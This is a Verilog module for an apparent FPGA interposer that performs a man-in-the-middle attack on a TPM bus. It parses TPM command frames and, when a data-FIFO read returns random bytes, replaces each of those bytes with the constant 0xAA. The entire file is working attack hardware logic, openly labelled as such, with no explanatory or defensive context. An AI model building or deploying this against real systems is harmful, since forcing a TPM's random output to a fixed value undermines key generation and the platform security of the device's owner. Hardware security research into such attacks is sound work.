/**
 * Main MITM logic module:
 * - utilizes the Bus interface module to intercept and modify communication
 * - an additional mode selecting input is used to switch dynamically between different MITM modes
**/

module MitmLogic #(

	// parameters
	parameter NUM_DATA_BITS = 8,
	parameter NUM_MITM_MODES = 2
) (

	// system inputs
	input wire sys_clk,
	input wire rst,
	
	// i/o inputs
	input wire [NUM_MITM_MODES-1:0] mode_select,
	
	// bus control outputs
	output reg fake_if0_select = 1'b0,
	output reg fake_if1_select = 1'b0,
	output reg fake_if0_send_start = 1'b0,
	output reg fake_if1_send_start = 1'b0,
	output reg fake_if0_keep_alive = 1'b0,
	output reg fake_if1_keep_alive = 1'b0,
	
	// bus status inputs
	input wire if0_recv_new_data,
	input wire if1_recv_new_data,
	input wire fake_if0_send_ready,
	input wire fake_if1_send_ready,
	input wire fake_if0_send_done,
	input wire fake_if1_send_done,
	
	// data
	output reg [NUM_DATA_BITS-1:0] fake_if0_send_data = 0,
	output reg [NUM_DATA_BITS-1:0] fake_if1_send_data = 0,
	input wire [NUM_DATA_BITS-1:0] real_if0_recv_data,
	input wire [NUM_DATA_BITS-1:0] real_if1_recv_data
);

	// mode definitions
	localparam MODE_FORWARD = 2'b01;
	localparam MODE_SUB_CONST = 2'b10;
	
	reg [NUM_MITM_MODES-1:0] mode = MODE_FORWARD;
	
	// MITM logic states
	localparam STATE_WAIT_TPM_RW = 0;
	localparam STATE_TPM_WAIT_STATE = 1;
	localparam STATE_MITM_FORK = 2;
	localparam STATE_MITM_ATTACK = 3;
	localparam STATE_FAKE_SEND_START = 4;
	localparam STATE_FAKE_SEND_WAIT = 5;
	localparam STATE_MITM_IGNORE = 6;
	localparam STATE_RESET = 7;
	
	// internal registers
	reg [3:0] state = STATE_RESET;

	reg [31:0] tpm_rw_cmd;
	reg [7:0] tpm_wait_state;
	
	reg [2:0] if0_tpm_rw_ctr = 3'd0;
	reg [2:0] if1_tpm_rw_ctr = 3'd0;
	reg [7:0] tpm_rw_size = 8'd0;
	
	reg [15:0] tpm_data_ctr = 16'd0;
	reg [15:0] tpm_rand_size = 16'd0;
	
	always @ (posedge sys_clk)
	begin
		// reset internal state
		if (rst == 1'b1) begin
			mode <= MODE_FORWARD;
		end
		
		else if (tpm_data_ctr == 16'd0 && state <= STATE_WAIT_TPM_RW) begin
			mode <= mode_select;
		end
	end
	
	always @ (posedge sys_clk)
	begin
		// reset internal state
		if (rst == 1'b1) begin
			state <= STATE_RESET;
		end
		
		else begin
			case (state)
				
				STATE_WAIT_TPM_RW: begin
					if (if0_recv_new_data == 1'b1) begin
						tpm_rw_cmd <= {tpm_rw_cmd[23:0], real_if0_recv_data};
						if0_tpm_rw_ctr <= if0_tpm_rw_ctr + 1;
					end
					if (if1_recv_new_data == 1'b1) begin
						tpm_wait_state <= real_if1_recv_data;
						if1_tpm_rw_ctr <= if1_tpm_rw_ctr + 1;
					end
					if (if0_tpm_rw_ctr == 3'd4 && if1_tpm_rw_ctr == 3'd4) begin
						if0_tpm_rw_ctr <= 3'd0;
						if1_tpm_rw_ctr <= 3'd0;
						if (tpm_rw_cmd[31] == 1'b0) begin
							state <= STATE_TPM_WAIT_STATE;
						end
						else if (tpm_wait_state == 8'h00) begin
							state <= STATE_TPM_WAIT_STATE;
						end
						else begin
							tpm_rw_size <= {1'b0, tpm_rw_cmd[30:24]} + 1;
							state <= STATE_MITM_FORK;
						end
					end
				end
				
				STATE_TPM_WAIT_STATE: begin
					if (if0_recv_new_data == 1'b1) begin
						if0_tpm_rw_ctr <= if0_tpm_rw_ctr + 1;
					end
					if (if1_recv_new_data == 1'b1) begin
						tpm_wait_state <= real_if1_recv_data;
						if1_tpm_rw_ctr <= if1_tpm_rw_ctr + 1;
					end
					if (if0_tpm_rw_ctr == 3'd1 && if1_tpm_rw_ctr == 3'd1) begin
						if0_tpm_rw_ctr <= 3'd0;
						if1_tpm_rw_ctr <= 3'd0;
						if (tpm_wait_state != 8'h00) begin
							if (tpm_rw_cmd[31] == 1'b0) begin
								tpm_rw_size <= {1'b0, tpm_rw_cmd[30:24]};
							end
							else begin
								tpm_rw_size <= {1'b0, tpm_rw_cmd[30:24]} + 1;
							end
							state <= STATE_MITM_FORK;
						end
					end
				end
				
				STATE_MITM_FORK: begin
					if (mode_select != MODE_FORWARD && tpm_rw_cmd[31] == 1'b1 && tpm_rw_cmd[7:0] == 8'h24) begin
						state <= STATE_MITM_ATTACK;
					end
					else begin
						state <= STATE_MITM_IGNORE;
					end
				end
				
				STATE_MITM_ATTACK: begin
					if (tpm_rw_size > 7'b0) begin
						if (tpm_data_ctr < 16'd10) begin
							if (if1_recv_new_data == 1'b1) begin
								tpm_data_ctr <= tpm_data_ctr + 1;
								tpm_rw_size <= tpm_rw_size - 1;
							end
						end
						else if (tpm_data_ctr < 16'd12) begin
							if (if1_recv_new_data == 1'b1) begin
								tpm_rand_size <= {tpm_rand_size[7:0], real_if1_recv_data};
								tpm_data_ctr <= tpm_data_ctr + 1;
								tpm_rw_size <= tpm_rw_size - 1;
							end
						end
						else if (tpm_data_ctr < 16'd12 + tpm_rand_size) begin
							if (fake_if0_send_ready == 1'b1) begin
								fake_if0_send_data <= 8'haa;
								fake_if0_select <= 1'b1;
								fake_if0_send_start <= 1'b1;
								state <= STATE_FAKE_SEND_START;
							end
						end
						
					end
					else begin
						if (tpm_data_ctr == 16'd12 + tpm_rand_size) begin
							tpm_data_ctr <= 16'd0;
						end
						fake_if0_select <= 1'b0;
						state <= STATE_WAIT_TPM_RW;
					end
				end
				
				STATE_FAKE_SEND_START: begin
					fake_if0_send_start <= 1'b0;
					state <= STATE_FAKE_SEND_WAIT;
				end
				
				STATE_FAKE_SEND_WAIT: begin
					if (fake_if0_send_done == 1'b1) begin
						tpm_data_ctr <= tpm_data_ctr + 1;
						tpm_rw_size <= tpm_rw_size - 1;
						state <= STATE_MITM_ATTACK;
					end
				end
				
				STATE_MITM_IGNORE: begin
					if (tpm_rw_size > 7'b0) begin
						if (if1_recv_new_data == 1'b1) begin
							tpm_rw_size <= tpm_rw_size - 1;
						end
					end
					else begin
						state <= STATE_WAIT_TPM_RW;
					end
				end
				
				STATE_RESET: begin
					if0_tpm_rw_ctr <= 3'd0;
					if1_tpm_rw_ctr <= 3'd0;
					tpm_rw_size <= 7'd0;
					
					tpm_data_ctr <= 16'd0;
					tpm_rand_size <= 16'd0;
					
					fake_if0_select <= 1'b0;
					fake_if0_keep_alive <= 1'b0;
					fake_if0_send_start <= 1'b0;
					
					state <= STATE_WAIT_TPM_RW;
				end
				
				// this should never occur
				default: begin
					state <= STATE_RESET;
				end
				
			endcase
		end
	end

endmodule